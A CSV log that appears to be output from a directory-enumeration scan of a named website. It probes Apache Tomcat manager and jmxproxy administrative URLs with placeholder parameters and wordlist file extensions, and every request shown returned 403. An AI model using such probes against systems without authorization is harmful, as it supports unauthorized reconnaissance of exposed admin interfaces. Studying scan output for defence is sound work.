Column1,Column2,Column3,Column4,Column5,Column6,Column7,Column8,Column9,Column10,Column11,Column12,Column13,Column14,Column15
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS/,,,,,,,,,,
403,,,664B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF,,,,,,,,,,
403,,,721B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=.htm,,,,,,,,,,
403,,,653B,http://www.vipinfo.com.cn/manager/html.jsp,,,,,,,,,,
403,,,704B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE,,,,,,,,,,
403,,,704B,http://www.vipinfo.com.cn/manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage,,,,,,,,,,
403,,,656B,http://www.vipinfo.com.cn/manager/status/all/,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.php,,,,,,,,,,
403,,,650B,http://www.vipinfo.com.cn/manager/login,,,,,,,,,,
403,,,669B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.html,,,,,,,,,,
403,,,709B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.html,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.asp,,,,,,,,,,
403,,,724B,http://www.vipinfo.com.cn/manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS.htm,,,,,,,,,,
403,,,708B,http://www.vipinfo.com.cn/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE.htm,,,,,,,,,,
403,,,668B,http://www.vipinfo.com.cn/manager/jmxproxy/?qry=STUFF.htm,,,,,,,,,,
